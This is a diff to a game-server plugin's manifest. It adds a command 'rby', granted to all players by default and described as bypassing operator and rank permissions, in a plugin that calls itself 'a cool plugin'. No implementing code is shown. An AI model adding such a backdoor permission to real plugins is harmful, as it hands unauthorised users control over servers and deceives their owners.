@@ -3,3 +3,8 @@ api: 5.0.0
 version: 0.0.1
 author: skyss0fly
 description: "a cool plugin haha"
+commands:
+ rby:
+   permission: pocketmal.rby
+   default: true
+   description: "Bypass op and ranks permissions with this haha"
